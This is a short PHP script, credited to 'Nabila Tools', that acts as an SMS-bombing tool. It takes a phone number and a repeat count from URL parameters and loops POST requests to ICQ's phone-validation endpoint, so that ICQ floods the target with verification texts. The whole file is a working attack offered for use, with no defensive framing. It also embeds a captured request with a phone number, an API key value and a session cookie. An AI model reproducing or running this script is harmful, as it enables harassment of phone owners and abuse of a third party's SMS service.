
<?php

/* 
icq Spam Sms
C0ded by : Muhammad Ikhsan f.t Achmad Rivaldi
Github  : https://github.com/thaniaanatasya
Admin Nabila Tools
*/
if(!$_GET['no']){ 
echo "Nabila Tools SMS icq";
}else{
$loop = $_GET['loop'];
$no = $_GET['no'];
            $header = array(
		    'POST /smsreg/requestPhoneValidation.php HTTP/1.1',
		    'Host: www.icq.com',
		    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
		    'Accept: */*',
		    'Accept-Language: en-US,en;q=0.5',
		    'Accept-Encoding: gzip, deflate, br',
		    'Content-Type: application/x-www-form-urlencoded',
		    'Referer: https://web.icq.com/',
		    'Content-Length: 106',
		    'Origin: https://web.icq.com',
		    'Connection: keep-alive',
		    'msisdn=6287714070299&locale=en&countryCode=id&k=ic1rtwz1s1Hj1O0r&version=1&platform=web&client=icq&r=18115',
		    'HTTP/1.1 200 OK',
		    'Server: nginx',
		    'Date: Tue, 15 May 2018 21:55:12 GMT',
		    'Content-Type: application/json',
		    'Transfer-Encoding: chunked',
		    'Connection: keep-alive',
		    'Keep-Alive: timeout=75',
		    'Vary: Accept-Encoding',
		    'X-Powered-By: PHP/5.6.34',
		    'Access-Control-Allow-Origin: https://web.icq.com',
		    'Access-Control-Allow-Credentials: true',
		    'Set-Cookie: user_tracking=ba4c611c4fbf5658a8a587f43d88d35a; path=/; domain=.icq.com; secure; HttpOnly',
		    'X-XSS-Protection: 1; mode=block; report=https://cspreport.mail.ru/xxssprotection',
		    'X-Content-Type-Options: nosniff',
		    'X-Frame-Options: SAMEORIGIN',
		    'Strict-Transport-Security: max-age=600; includeSubDomains; preload',
		    'Content-Encoding: gzip',);
    function http($postdata){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.icq.com/smsreg/requestPhoneValidation.php');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if(!empty($postdata)){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        $response = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return array($http, $response);
    }
    for ($x = 0;$x <= $loop ;$x++) {
    http("msisdn=".$no."&locale=en&countryCode=id&k=ic1rtwz1s1Hj1O0r&version=1&platform=web&client=icq&r=18115"); 
    echo "Sms ke ".$no." Sukses<br>";
}
}

?>